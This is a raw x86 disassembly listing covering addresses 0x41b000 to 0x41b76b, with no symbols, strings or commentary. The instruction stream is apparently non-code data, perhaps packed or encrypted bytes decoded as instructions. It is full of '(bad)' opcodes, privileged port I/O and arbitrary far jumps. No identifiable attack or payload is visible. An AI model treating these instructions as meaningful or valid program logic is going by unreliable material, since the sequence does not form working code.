  41b000:	ret    
  41b001:	inc    ebx
  41b002:	cli    
  41b003:	popf   
  41b004:	mov    al,ds:0xf33d10a8
  41b009:	icebp  
  41b00a:	jl     0x41afc4
  41b00c:	mov    bl,0x56
  41b00e:	std    
  41b00f:	bound  esp,QWORD PTR [di]
  41b012:	mov    edi,0xd11ae048
  41b017:	adc    DWORD PTR [edi-0x40],0xffffffe3
  41b01b:	repnz sbb DWORD PTR [ecx+0x7e],ebx
  41b01f:	sahf   
  41b020:	ficom  DWORD PTR [ecx]
  41b022:	mov    ds:0x6f373d96,al
  41b027:	(bad)  
  41b028:	mov    esi,0xd2cf707c
  41b02d:	outs   dx,DWORD PTR ds:[esi]
  41b02e:	out    0x60,al
  41b030:	add    DWORD PTR [ebx+esi*1-0x73d3646],eax
  41b037:	push   cs
  41b038:	pop    ds
  41b039:	jne    0x41b073
  41b03b:	daa    
  41b03c:	dec    eax
  41b03d:	sub    dh,dh
  41b03f:	adc    BYTE PTR [edi+edx*8+0xd],ch
  41b043:	mov    esp,0x1190aa7c
  41b048:	jne    0x41b05d
  41b04a:	xor    ax,0x8e78
  41b04e:	imul   ebp,DWORD PTR [eiz*8+0x479a59a0],0xd5cd8039
  41b059:	xchg   DWORD PTR [edi-0x76],edi
  41b05c:	dec    edi
  41b05d:	inc    ebp
  41b05e:	dec    esi
  41b05f:	sti    
  41b060:	imul   BYTE PTR [edi+0x6bba37a0]
  41b066:	cmp    DWORD PTR [eax+0x44],esp
  41b069:	sti    
  41b06a:	sbb    DWORD PTR [edi-0x1d86725b],eax
  41b070:	mov    edi,0x278a7857
  41b075:	(bad)  
  41b076:	fmul   DWORD PTR [eax-0x42b38ea7]
  41b07c:	icebp  
  41b07d:	leave  
  41b07e:	out    dx,al
  41b07f:	cld    
  41b080:	arpl   WORD PTR ds:0x7220e9e2,dx
  41b086:	ror    DWORD PTR [edx],1
  41b088:	sar    BYTE PTR [edx+0x66],0xbf
  41b08c:	xor    al,0xeb
  41b08e:	dec    esi
  41b08f:	fst    QWORD PTR [esi+0x227a97e]
  41b095:	loope  0x41b0db
  41b097:	mov    es,WORD PTR [esi+ebx*8-0x7d455e3c]
  41b09e:	leave  
  41b09f:	jle    0x41b0a9
  41b0a1:	dec    esp
  41b0a2:	inc    esi
  41b0a3:	xchg   ecx,eax
  41b0a4:	inc    esi
  41b0a5:	cwde   
  41b0a6:	dec    edx
  41b0a7:	rcr    DWORD PTR [eax+0x3f35c395],cl
  41b0ad:	das    
  41b0ae:	or     eax,0x2de097b9
  41b0b3:	fucomi st,st(0)
  41b0b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0b6:	mov    bl,0x0
  41b0b8:	aad    0xda
  41b0ba:	xlat   BYTE PTR ds:[ebx]
  41b0bb:	and    al,0x36
  41b0bd:	fidiv  WORD PTR [esi]
  41b0bf:	lea    eax,[eax-0x73c89281]
  41b0c5:	mov    ds:0xec6f49dd,al
  41b0ca:	cdq    
  41b0cb:	inc    ecx
  41b0cc:	or     eax,0x624ac719
  41b0d1:	fmul   QWORD PTR [ebx]
  41b0d3:	daa    
  41b0d4:	mov    edx,0xb74c6f32
  41b0d9:	add    eax,0xc9926dc0
  41b0de:	ret    0x33f8
  41b0e1:	inc    esi
  41b0e2:	ret    
  41b0e3:	(bad)  
  41b0e4:	scas   al,BYTE PTR es:[edi]
  41b0e5:	fistp  WORD PTR [di-0x7e]
  41b0e9:	(bad)  
  41b0ea:	cld    
  41b0eb:	adc    ch,0xf7
  41b0ee:	loope  0x41b0a4
  41b0f0:	mov    ds:0xafde7dd1,al
  41b0f5:	ret    0xa7f0
  41b0f8:	stos   BYTE PTR es:[edi],al
  41b0f9:	sub    ch,BYTE PTR [ecx-0x7d4cf62c]
  41b0ff:	mov    es,WORD PTR [ebp+0x37]
  41b102:	push   ebx
  41b103:	lods   al,BYTE PTR ds:[esi]
  41b104:	pop    ds
  41b105:	mov    ecx,DWORD PTR [edx+0x2575ee63]
  41b10b:	mov    esi,0xae92fdb0
  41b110:	(bad)  [ebp+0x6812a55f]
  41b116:	clc    
  41b117:	mul    BYTE PTR [ebx+0x7a263d05]
  41b11d:	in     al,0x5a
  41b11f:	mov    ebx,0x8a4fa828
  41b124:	rcr    bl,0xe8
  41b127:	into   
  41b128:	bound  ebx,QWORD PTR [esi]
  41b12a:	mov    ds:0x10607a25,eax
  41b12f:	inc    ebx
  41b130:	cmp    dh,BYTE PTR [ecx]
  41b132:	push   ss
  41b133:	sbb    dl,cl
  41b135:	mov    eax,DWORD PTR [ebp-0x3a741a1c]
  41b13b:	call   DWORD PTR [ecx-0x10267e89]
  41b141:	rol    DWORD PTR [edi+0x7760ad76],1
  41b147:	adc    DWORD PTR [esi],edx
  41b149:	pop    ebx
  41b14a:	cdq    
  41b14b:	inc    ecx
  41b14c:	jmp    0x41b1a8
  41b14e:	and    DWORD PTR [esi],0x2
  41b151:	or     al,ah
  41b153:	es pop esi
  41b155:	fiadd  WORD PTR [ecx-0x7e]
  41b158:	enter  0x5117,0x8e
  41b15c:	gs inc edx
  41b15e:	ret    
  41b15f:	push   cs
  41b160:	xchg   ecx,eax
  41b161:	jle    0x41b178
  41b163:	mov    ebp,0xcf5f6167
  41b169:	popf   
  41b16a:	imul   ebx,edi,0x6d
  41b16d:	lock stc 
  41b16f:	push   edx
  41b170:	xchg   ebx,eax
  41b171:	cmp    BYTE PTR [ecx+eax*8-0x36643964],ah
  41b178:	jl     0x41b1b8
  41b17a:	test   eax,0xb68cf4c9
  41b17f:	mov    ecx,DWORD PTR [esi]
  41b181:	pop    ecx
  41b182:	popa   
  41b183:	mov    WORD PTR [ebp-0x52],gs
  41b186:	jle    0x41b17f
  41b188:	in     al,0x7a
  41b18a:	push   eax
  41b18b:	mov    edi,0x21186986
  41b190:	jnp    0x41b1af
  41b192:	push   ecx
  41b193:	add    dh,BYTE PTR [ecx-0x4d5ddb89]
  41b199:	mov    ah,0x17
  41b19b:	pop    ebp
  41b19c:	push   ebx
  41b19d:	ss push ecx
  41b19f:	fldcw  WORD PTR [ebx-0x6857fa0d]
  41b1a5:	cmp    eax,0x6c177d3d
  41b1aa:	sub    ecx,edi
  41b1ac:	shl    BYTE PTR [esi],cl
  41b1ae:	rcr    bh,cl
  41b1b0:	xchg   ecx,eax
  41b1b1:	test   BYTE PTR [ebx-0x19],0x5a
  41b1b5:	aaa    
  41b1b6:	add    al,0x7e
  41b1b8:	xor    ah,bh
  41b1ba:	sub    ch,BYTE PTR [esi-0x5de7c75c]
  41b1c0:	test   bl,ah
  41b1c2:	push   esp
  41b1c3:	ret    
  41b1c4:	push   edi
  41b1c5:	shr    BYTE PTR [esi-0x60],cl
  41b1c8:	das    
  41b1c9:	mov    edx,0x95316bd7
  41b1ce:	mov    ds:0xe27f4bf4,al
  41b1d3:	out    dx,eax
  41b1d4:	or     ebx,DWORD PTR [edx-0x244cb4d2]
  41b1da:	jmp    0x1b41:0x59cc418e
  41b1e1:	pop    esi
  41b1e2:	mov    edx,0xc8dafde5
  41b1e7:	jae    0x41b1a0
  41b1e9:	(bad)  
  41b1ea:	stc    
  41b1eb:	arpl   WORD PTR [ebp+0x1067d642],cx
  41b1f1:	mov    ecx,0x9f764e0c
  41b1f6:	sub    BYTE PTR [esi-0x39],ch
  41b1f9:	mov    edx,0xa389b7d5
  41b1fe:	pop    ss
  41b1ff:	mov    esi,0x5adf5e2e
  41b204:	arpl   si,si
  41b206:	ins    BYTE PTR es:[edi],dx
  41b207:	fst    st(6)
  41b209:	pop    ss
  41b20a:	mov    al,ds:0x80b3ec10
  41b20f:	ins    DWORD PTR es:[edi],dx
  41b210:	stos   DWORD PTR es:[edi],eax
  41b211:	fisttp DWORD PTR [eax-0x5617ae6d]
  41b217:	or     DWORD PTR [ecx],0x12
  41b21a:	es push cs
  41b21c:	adc    BYTE PTR [esi*8-0x65ee1101],bh
  41b223:	jmp    0xdb03e82b
  41b228:	jae    0x41b241
  41b22a:	out    0xb9,eax
  41b22c:	jns    0x41b275
  41b22e:	mov    ds:0x1adf13a2,eax
  41b233:	int3   
  41b234:	jl     0x41b269
  41b236:	(bad)  
  41b238:	ins    DWORD PTR es:[edi],dx
  41b239:	inc    esi
  41b23a:	ins    DWORD PTR es:[edi],dx
  41b23b:	sahf   
  41b23c:	adc    dl,BYTE PTR [esi-0x41]
  41b23f:	in     al,0x56
  41b241:	popf   
  41b242:	fs addr16 dec ecx
  41b245:	jno    0x41b247
  41b247:	xor    eax,0xae57f99c
  41b24c:	pmaxsw mm2,QWORD PTR [edx-0x68]
  41b250:	aaa    
  41b251:	mov    eax,0x636b0008
  41b256:	sbb    eax,0x84b8f004
  41b25b:	dec    ebx
  41b25c:	inc    ebx
  41b25d:	pmaxub mm0,QWORD PTR [edx-0x44]
  41b261:	or     ch,BYTE PTR [edi+0x3b]
  41b264:	adc    ebp,esi
  41b266:	call   0x2d75a546
  41b26b:	sbb    eax,0xe9e5fd78
  41b270:	leave  
  41b271:	mov    ah,0x1b
  41b273:	sti    
  41b274:	in     al,dx
  41b275:	xor    dh,BYTE PTR [edx]
  41b277:	jmp    0x6698:0x757c6b48
  41b27e:	sbb    ah,BYTE PTR [ecx+ebx*4+0x3d]
  41b282:	in     eax,dx
  41b283:	adc    DWORD PTR [ebx],ebx
  41b285:	enter  0x6771,0xe6
  41b289:	out    0xdf,al
  41b28b:	call   0xba36967c
  41b290:	(bad)  
  41b291:	js     0x41b2a1
  41b293:	sub    ebp,esp
  41b295:	mov    dl,0x33
  41b297:	jl     0x41b2db
  41b299:	add    BYTE PTR [ecx],ah
  41b29b:	adc    al,0x13
  41b29d:	hlt    
  41b29e:	es nop
  41b2a0:	push   ecx
  41b2a1:	mov    cl,0x1c
  41b2a3:	sahf   
  41b2a4:	cmc    
  41b2a5:	fimul  WORD PTR [esi-0x7a]
  41b2a8:	cmc    
  41b2a9:	or     al,0x46
  41b2ab:	jns    0x41b27f
  41b2ad:	dec    eax
  41b2ae:	mov    ebp,0xbd5e15ad
  41b2b3:	std    
  41b2b4:	and    DWORD PTR [esi-0x73f01fad],ecx
  41b2ba:	shl    DWORD PTR [ebx+0x3d],0x92
  41b2be:	ss iret 
  41b2c0:	add    al,ah
  41b2c2:	and    bl,BYTE PTR [eax-0x14]
  41b2c5:	add    dh,BYTE PTR [edi]
  41b2c7:	outs   dx,BYTE PTR ds:[esi]
  41b2c8:	test   eax,0x6b3e9802
  41b2cd:	pop    esp
  41b2ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2cf:	add    al,0xdc
  41b2d1:	pop    ebp
  41b2d2:	push   cs
  41b2d3:	adc    ecx,DWORD PTR [ebp-0x4e50eefc]
  41b2d9:	hlt    
  41b2da:	loop   0x41b2c8
  41b2dc:	stos   DWORD PTR es:[edi],eax
  41b2dd:	pop    ebx
  41b2de:	or     DWORD PTR ds:0xf143d2c3,edi
  41b2e4:	cmp    eax,DWORD PTR ds:[esi+0x24]
  41b2e8:	fs sbb dh,al
  41b2eb:	imul   edx,DWORD PTR [esi+eiz*8-0x29df4154],0xffffff9a
  41b2f3:	jecxz  0x41b2c0
  41b2f5:	inc    esp
  41b2f6:	mov    DWORD PTR [ebx],ecx
  41b2f8:	out    dx,eax
  41b2f9:	in     al,dx
  41b2fa:	test   al,0xcb
  41b2fc:	leave  
  41b2fd:	idiv   bl
  41b2ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b300:	mov    eax,0x46ebfae3
  41b305:	inc    esi
  41b306:	mov    DWORD PTR [edi],ebx
  41b308:	or     al,0xb9
  41b30a:	dec    edi
  41b30b:	iret   
  41b30c:	retf   0x6140
  41b30f:	stos   BYTE PTR es:[edi],al
  41b310:	pop    ss
  41b311:	lock push 0x40ef622c
  41b317:	pop    ebp
  41b318:	and    BYTE PTR [esp+ebx*8+0x4cf0664a],al
  41b31f:	xor    edi,DWORD PTR cs:[eax+ebp*1+0x50]
  41b324:	imul   ebp,DWORD PTR [esp+esi*4],0x7437576c
  41b32b:	repnz dec esp
  41b32d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b32e:	jl     0x41b2d9
  41b330:	js     0x41b2cf
  41b332:	repz dec ebp
  41b334:	push   ebx
  41b335:	scas   al,BYTE PTR es:[edi]
  41b336:	inc    ecx
  41b337:	and    eax,0x86540853
  41b33c:	cmp    esp,DWORD PTR ds:0x367d95a7
  41b342:	adc    eax,0xcd6e0483
  41b347:	xchg   esp,eax
  41b348:	mov    fs,WORD PTR [ebx+0x5f]
  41b34b:	(bad)  
  41b34c:	mov    ds:0x8fa6eb06,al
  41b351:	leave  
  41b352:	lods   eax,DWORD PTR ds:[esi]
  41b353:	int    0xdc
  41b355:	aam    0x9a
  41b357:	test   eax,0xf41692fe
  41b35c:	loopne 0x41b32e
  41b35e:	push   esi
  41b35f:	xchg   edx,eax
  41b360:	fs push ss
  41b362:	out    0xc4,eax
  41b364:	jecxz  0x41b31b
  41b366:	fwait
  41b367:	bound  eax,QWORD PTR [esi-0x5b]
  41b36a:	jmp    0x41b35a
  41b36c:	dec    edx
  41b36d:	into   
  41b36e:	(bad)  
  41b370:	push   es
  41b371:	mov    ds:0xcfaf6e90,eax
  41b376:	xchg   DWORD PTR ds:0x8de8a301,esp
  41b37c:	jmp    0x41b3c3
  41b37e:	sahf   
  41b37f:	popa   
  41b380:	int    0xc8
  41b382:	mov    ebx,0x7d15321b
  41b387:	jmp    0x41b318
  41b389:	push   edi
  41b38a:	hlt    
  41b38b:	or     al,0x79
  41b38d:	out    dx,eax
  41b38e:	cwde   
  41b38f:	sbb    DWORD PTR [edx+0x3710f4cc],eax
  41b395:	jb     0x41b3e2
  41b397:	dec    ebp
  41b398:	mul    al
  41b39a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b39b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b39c:	ja     0x41b360
  41b39e:	or     ebp,DWORD PTR [esi+0x782b1589]
  41b3a4:	inc    eax
  41b3a5:	jmp    FWORD PTR [ebp+0x6d]
  41b3a8:	sbb    al,al
  41b3aa:	call   0x729a43c8
  41b3af:	rcl    BYTE PTR [edi],1
  41b3b1:	clc    
  41b3b2:	adc    al,0x40
  41b3b4:	mov    esi,0xb9bc947e
  41b3b9:	out    0xe4,eax
  41b3bb:	sbb    al,0xfe
  41b3bd:	sub    al,0x81
  41b3c0:	leave  
  41b3c1:	pop    ebx
  41b3c2:	pushf  
  41b3c3:	clc    
  41b3c4:	pop    ecx
  41b3c5:	xchg   esp,eax
  41b3c6:	mov    edx,DWORD PTR [ebx+0x3d]
  41b3c9:	jmp    0x41b3e8
  41b3cb:	jg     0x41b37a
  41b3cd:	sbb    ebp,esi
  41b3cf:	dec    ebx
  41b3d0:	imul   ebp,DWORD PTR [eax+0x26],0x7371b762
  41b3d7:	leave  
  41b3d8:	add    DWORD PTR [ecx+eiz*2+0x55],esp
  41b3dc:	xor    DWORD PTR [ecx+0x1],ebx
  41b3df:	add    BYTE PTR ds:0x1c279fd4,0x3c
  41b3e6:	mov    al,0x3b
  41b3e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3e9:	mov    ah,0x84
  41b3eb:	out    0x6e,eax
  41b3ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3ee:	call   DWORD PTR [ebp+0x7f36c4f2]
  41b3f4:	mov    al,ds:0xd6b15592
  41b3f9:	shr    DWORD PTR [edx+0x3cd52818],1
  41b3ff:	sbb    dl,0x9f
  41b402:	lahf   
  41b403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b404:	std    
  41b405:	stos   DWORD PTR es:[edi],eax
  41b406:	jl     0x41b432
  41b408:	adc    DWORD PTR [eax+0x353ec895],edx
  41b40e:	fisubr WORD PTR [ebp+eax*8+0x2a487a41]
  41b415:	outs   dx,DWORD PTR ds:[esi]
  41b416:	and    dh,BYTE PTR [ebx-0x34]
  41b419:	and    eax,ebx
  41b41b:	jb     0x41b47e
  41b41d:	pop    ecx
  41b41e:	fisubr WORD PTR fs:[edx-0x6]
  41b422:	inc    edx
  41b423:	js     0x41b47f
  41b425:	cmp    dh,0x8
  41b428:	mov    ecx,0x2e578902
  41b42d:	sbb    dl,BYTE PTR [ecx]
  41b42f:	push   esp
  41b430:	inc    eax
  41b431:	pop    ecx
  41b432:	inc    ebp
  41b433:	mov    edx,0xde3e1fb1
  41b438:	jmp    0x3cd68766
  41b43d:	(bad)  
  41b43e:	sub    eax,0x4c7a9190
  41b443:	nop
  41b444:	mov    al,ds:0x87efbad
  41b449:	and    DWORD PTR [ecx],esp
  41b44b:	jnp    0x41b4c8
  41b44d:	inc    edx
  41b44e:	push   eax
  41b44f:	or     BYTE PTR [esi],ah
  41b451:	test   eax,0xd107ac74
  41b456:	lahf   
  41b457:	lds    edx,FWORD PTR [eax+0x19976193]
  41b45d:	stos   DWORD PTR es:[edi],eax
  41b45e:	inc    edi
  41b45f:	mov    bh,0x1c
  41b461:	dec    edx
  41b462:	aas    
  41b463:	add    al,0x44
  41b465:	push   DWORD PTR [edi+0x5deec25c]
  41b46b:	aad    0xe3
  41b46d:	iret   
  41b46e:	sub    BYTE PTR [ebx+ebp*2],ah
  41b471:	out    0x3e,eax
  41b473:	jb     0x41b3fd
  41b475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b476:	stos   DWORD PTR es:[edi],eax
  41b477:	cli    
  41b478:	xor    al,0x4f
  41b47a:	stc    
  41b47b:	hlt    
  41b47c:	retf   0xbb4e
  41b47f:	sub    DWORD PTR [esi-0x14],esp
  41b482:	int3   
  41b483:	test   al,0xcc
  41b485:	mul    BYTE PTR [edi]
  41b487:	dec    ecx
  41b488:	pusha  
  41b489:	push   ecx
  41b48a:	(bad)  
  41b48b:	mov    ecx,0xe727a997
  41b490:	jo     0x41b4a0
  41b492:	jmp    0x5dc625bd
  41b497:	jb     0x41b4b5
  41b499:	clc    
  41b49a:	ror    bl,cl
  41b49c:	leave  
  41b49d:	out    0x22,al
  41b49f:	sub    bh,BYTE PTR [ebx+0x44193df0]
  41b4a5:	push   esi
  41b4a6:	repz push cs
  41b4a8:	test   al,0x3b
  41b4aa:	jmp    0x69ca:0x95d7c49
  41b4b1:	dec    ecx
  41b4b2:	(bad)  
  41b4b3:	fidiv  DWORD PTR [eax+0x5a]
  41b4b6:	xchg   ebx,eax
  41b4b7:	jmp    0x5c4c0be6
  41b4bc:	mov    dl,0x85
  41b4be:	mov    edi,0x1d2d48a9
  41b4c3:	xchg   ebp,eax
  41b4c4:	push   eax
  41b4c5:	lock mov eax,ds:0xd0c82e8f
  41b4cb:	rol    DWORD PTR [ebx],cl
  41b4cd:	mov    ah,0x1
  41b4cf:	pop    esi
  41b4d0:	push   ecx
  41b4d1:	clc    
  41b4d2:	rcr    bh,cl
  41b4d4:	sbb    cl,al
  41b4d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4d7:	sub    eax,0x2eb50f36
  41b4dc:	push   ebx
  41b4dd:	ins    BYTE PTR es:[edi],dx
  41b4de:	popf   
  41b4df:	add    al,0x23
  41b4e1:	fwait
  41b4e2:	lods   al,BYTE PTR ds:[esi]
  41b4e3:	sar    BYTE PTR [ebp+0x59],cl
  41b4e6:	xchg   ecx,eax
  41b4e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4e8:	dec    ebx
  41b4e9:	and    al,0x95
  41b4eb:	and    DWORD PTR [eax+0x6a],0xffffffe9
  41b4ef:	mov    esi,0x9da2896b
  41b4f4:	pop    DWORD PTR [edx]
  41b4f6:	cmp    DWORD PTR [edx-0x352441dc],ecx
  41b4fc:	js     0x41b579
  41b4fe:	add    esp,DWORD PTR [eax+0x1b1f713e]
  41b504:	inc    eax
  41b505:	sbb    al,BYTE PTR [ebp+0x5dd5f1a2]
  41b50b:	inc    eax
  41b50c:	mov    ecx,0x5cc1a231
  41b511:	rcl    BYTE PTR [ecx+edx*4],1
  41b514:	push   ecx
  41b515:	inc    edx
  41b516:	add    ch,BYTE PTR [eax+0x12cc5f22]
  41b51c:	add    bh,BYTE PTR [eax]
  41b51e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b51f:	jp     0x41b521
  41b521:	push   0x9
  41b523:	fbstp  TBYTE PTR [edi+0xcc8477d]
  41b529:	out    0x55,eax
  41b52b:	mov    ch,0x0
  41b52d:	and    esp,esi
  41b52f:	cmp    eax,0x4e2345cc
  41b534:	aas    
  41b535:	jmp    0x41b515
  41b537:	mov    ss,WORD PTR [ebx+0x6c9b5cde]
  41b53d:	jmp    0x91bf:0xb4b53ed6
  41b544:	paddq  mm3,QWORD PTR [esi-0x2a01a593]
  41b54b:	out    dx,eax
  41b54c:	sub    cl,0xf4
  41b54f:	xlat   BYTE PTR ds:[ebx]
  41b550:	fstp   DWORD PTR [edx+0x201d5ff0]
  41b556:	cmp    DWORD PTR [ebx+0xc558b7a],ebx
  41b55c:	sub    BYTE PTR [esi+0x4200b77b],ah
  41b562:	jg     0x41b5dc
  41b564:	call   FWORD PTR [edx-0x16]
  41b567:	add    BYTE PTR [ebx-0x4eefeaae],al
  41b56d:	retf   
  41b56e:	rcl    esi,0x81
  41b571:	rcr    BYTE PTR [eax],cl
  41b573:	hlt    
  41b574:	imul   ecx,DWORD PTR [esi],0x6710ab0a
  41b57a:	inc    ebp
  41b57b:	out    dx,eax
  41b57c:	adc    esp,DWORD PTR [edi]
  41b57e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b57f:	jle    0x41b552
  41b581:	gs xchg ebp,eax
  41b583:	dec    eax
  41b584:	std    
  41b585:	or     cl,cl
  41b587:	ret    
  41b588:	mov    DWORD PTR [edx],0xaa774164
  41b58e:	push   cs
  41b58f:	dec    ecx
  41b590:	sub    BYTE PTR ss:[edi-0x14c45932],bh
  41b597:	enter  0xb8ae,0x5b
  41b59b:	dec    eax
  41b59c:	test   BYTE PTR [edx-0x1c],ch
  41b59f:	(bad)  
  41b5a0:	leave  
  41b5a1:	sub    al,0xe1
  41b5a3:	or     DWORD PTR ds:0xd275148d,eax
  41b5a9:	mov    ecx,0x36baafec
  41b5ae:	(bad)  
  41b5b0:	ret    
  41b5b1:	xchg   edi,eax
  41b5b2:	(bad)  
  41b5b3:	add    eax,0x8c211b55
  41b5b8:	sub    BYTE PTR [ecx],ch
  41b5ba:	xchg   esi,eax
  41b5bb:	inc    edi
  41b5bc:	dec    eax
  41b5bd:	(bad)  
  41b5be:	rol    BYTE PTR [ebx+0x7],0xe
  41b5c2:	mov    esi,0x7c07c280
  41b5c7:	shr    DWORD PTR [edi+0x4],1
  41b5ca:	mov    bh,0x99
  41b5cc:	hlt    
  41b5cd:	mov    ds:0xc980a555,eax
  41b5d2:	cwde   
  41b5d3:	loope  0x41b648
  41b5d5:	push   0xffffffae
  41b5d7:	addr16 jne 0x41b60e
  41b5da:	stos   BYTE PTR es:[edi],al
  41b5db:	cmp    ch,bl
  41b5dd:	scas   eax,DWORD PTR es:[edi]
  41b5de:	dec    esp
  41b5df:	cld    
  41b5e0:	popf   
  41b5e1:	cdq    
  41b5e2:	cmp    ch,BYTE PTR [esi]
  41b5e4:	test   BYTE PTR [ebp+ebx*4+0x3e8b851e],al
  41b5eb:	push   ebx
  41b5ec:	mov    esp,0xcb71eb97
  41b5f1:	ins    BYTE PTR es:[edi],dx
  41b5f2:	pop    eax
  41b5f3:	sub    DWORD PTR [esp+eax*1+0x66],esp
  41b5f7:	sub    eax,0x1ea43ead
  41b5fc:	hlt    
  41b5fd:	cs in  eax,0x52
  41b600:	push   ds
  41b601:	jecxz  0x41b5fc
  41b603:	and    eax,0x88bd247c
  41b608:	(bad)  [esi]
  41b60a:	mov    bl,0x90
  41b60c:	jns    0x41b5c3
  41b60e:	ret    
  41b60f:	xor    edi,ecx
  41b611:	mov    ebp,0x1d289567
  41b616:	dec    esp
  41b617:	sbb    esi,DWORD PTR [esi]
  41b619:	mov    al,0x6e
  41b61b:	or     edx,eax
  41b61d:	mov    eax,ds:0x65514583
  41b622:	sbb    al,BYTE PTR [eax+ecx*1-0x2f]
  41b626:	in     eax,0x3f
  41b628:	rep lods eax,DWORD PTR ds:[esi]
  41b62a:	cmp    DWORD PTR [bp+si],0x9be7c9df
  41b631:	je     0x41b63f
  41b633:	add    ebp,edx
  41b635:	xchg   esp,eax
  41b636:	adc    BYTE PTR [edi],bl
  41b638:	jae    0x41b611
  41b63a:	pop    es
  41b63b:	lock (bad) 
  41b63d:	shr    bh,0xb7
  41b640:	retf   0xd431
  41b643:	fdivr  DWORD PTR [esi+eax*4]
  41b646:	jb     0x41b6bb
  41b648:	or     DWORD PTR [eax],edx
  41b64a:	adc    ch,BYTE PTR [edi+0x63]
  41b64d:	mov    edi,0xbb9432eb
  41b652:	ins    BYTE PTR es:[edi],dx
  41b653:	mov    ecx,0x15b198b3
  41b658:	pop    ecx
  41b659:	push   eax
  41b65a:	scas   eax,DWORD PTR es:[edi]
  41b65b:	sub    edx,DWORD PTR [ebx]
  41b65d:	jecxz  0x41b6ab
  41b65f:	iret   
  41b660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b661:	push   ebx
  41b662:	add    ebx,edx
  41b664:	sbb    DWORD PTR [edx],ecx
  41b666:	xchg   ebp,eax
  41b667:	adc    DWORD PTR [eax+0x508ddd2b],ebx
  41b66d:	std    
  41b66e:	or     edi,esi
  41b670:	dec    esp
  41b671:	push   cs
  41b672:	daa    
  41b673:	das    
  41b674:	mov    ah,0xa4
  41b676:	lods   al,BYTE PTR ds:[esi]
  41b677:	sub    ch,BYTE PTR [esi+0x46]
  41b67a:	sbb    dh,dl
  41b67c:	clc    
  41b67d:	inc    ebp
  41b67e:	push   ecx
  41b67f:	push   ss
  41b680:	leave  
  41b681:	pop    eax
  41b682:	popf   
  41b683:	add    al,BYTE PTR [ebx]
  41b685:	add    al,0x0
  41b687:	mov    edx,0x7b11eea4
  41b68c:	clc    
  41b68d:	aas    
  41b68e:	in     al,dx
  41b68f:	or     esp,ecx
  41b691:	xchg   ebp,eax
  41b692:	icebp  
  41b693:	mov    ebp,0xf7df7222
  41b698:	cmp    DWORD PTR [ebp-0x62645468],edi
  41b69e:	xor    DWORD PTR [edx+0x41],ecx
  41b6a1:	pushf  
  41b6a2:	loopne 0x41b6b1
  41b6a4:	aaa    
  41b6a5:	sar    DWORD PTR [ebx+0x36910b50],0x16
  41b6ac:	push   esi
  41b6ad:	clc    
  41b6ae:	cwde   
  41b6af:	sub    dl,BYTE PTR [ecx]
  41b6b1:	mov    esi,0x4fa537e3
  41b6b6:	or     BYTE PTR [ecx],cl
  41b6b8:	enter  0x8fc2,0x3e
  41b6bc:	jno    0x41b6b7
  41b6be:	shr    esi,1
  41b6c0:	outs   dx,BYTE PTR ds:[esi]
  41b6c1:	lea    edi,ds:0xde5ac5eb
  41b6c7:	xchg   esi,eax
  41b6c8:	pushf  
  41b6c9:	or     eax,0x175c2ce
  41b6ce:	xchg   edx,eax
  41b6cf:	fs popa 
  41b6d1:	add    ebx,DWORD PTR [ebx+0xf984cf0]
  41b6d7:	test   eax,0x6ac71ba
  41b6dc:	adc    BYTE PTR [esi-0x3f],bh
  41b6df:	pop    edi
  41b6e0:	ret    0x2b2c
  41b6e3:	mov    cl,0x6c
  41b6e5:	retf   
  41b6e6:	push   eax
  41b6e7:	sahf   
  41b6e8:	stc    
  41b6e9:	jge    0x41b745
  41b6eb:	push   ebx
  41b6ec:	(bad)  
  41b6ee:	ja     0x41b680
  41b6f0:	sbb    ebp,esp
  41b6f2:	xchg   esi,eax
  41b6f3:	dec    edx
  41b6f4:	retf   
  41b6f5:	imul   DWORD PTR [ecx]
  41b6f7:	jae    0x41b6b7
  41b6f9:	pusha  
  41b6fa:	lahf   
  41b6fb:	clc    
  41b6fc:	int    0x5c
  41b6fe:	ins    BYTE PTR es:[edi],dx
  41b6ff:	frstor ds:0x43ccb8e9
  41b705:	shl    BYTE PTR [esi-0x19206fc5],cl
  41b70b:	sub    eax,DWORD PTR [ecx+edx*1]
  41b70e:	sbb    ebx,DWORD PTR [edx+0x4a8aa2c0]
  41b714:	xchg   ebx,eax
  41b715:	int3   
  41b716:	lds    esi,FWORD PTR [esi-0x31]
  41b719:	and    al,0x17
  41b71b:	push   edi
  41b71c:	icebp  
  41b71d:	data16 and al,0x1b
  41b720:	cli    
  41b721:	(bad)  
  41b722:	ins    DWORD PTR es:[edi],dx
  41b723:	ins    DWORD PTR es:[edi],dx
  41b724:	adc    edx,DWORD PTR [esi+eax*4+0x28b95cf3]
  41b72b:	and    eax,0x3a37618c
  41b730:	das    
  41b731:	xor    DWORD PTR [ecx+0x663e4b75],ebx
  41b737:	mov    al,0xbc
  41b739:	cs cli 
  41b73b:	sbb    al,0x99
  41b73d:	add    al,0x39
  41b73f:	fcomp  st(4)
  41b741:	jno    0x41b799
  41b743:	inc    ecx
  41b744:	pop    ebx
  41b745:	leave  
  41b746:	stos   BYTE PTR es:[edi],al
  41b747:	cmp    al,0xe6
  41b749:	cmp    eax,0xf302090e
  41b74e:	lods   eax,DWORD PTR ds:[esi]
  41b74f:	retf   0x87e5
  41b752:	sub    edi,esp
  41b754:	push   es
  41b755:	clc    
  41b756:	adc    cl,BYTE PTR ds:0xe256d2f6
  41b75c:	sub    ebp,DWORD PTR [edx+0x70fcc868]
  41b762:	fwait
  41b763:	mov    cl,0x28
  41b765:	sbb    al,0xfe
  41b767:	inc    esp
  41b768:	mov    al,0x73
  41b76a:	dec    ebx
  41b76b:	outs   dx,BYTE PTR ds:[esi]
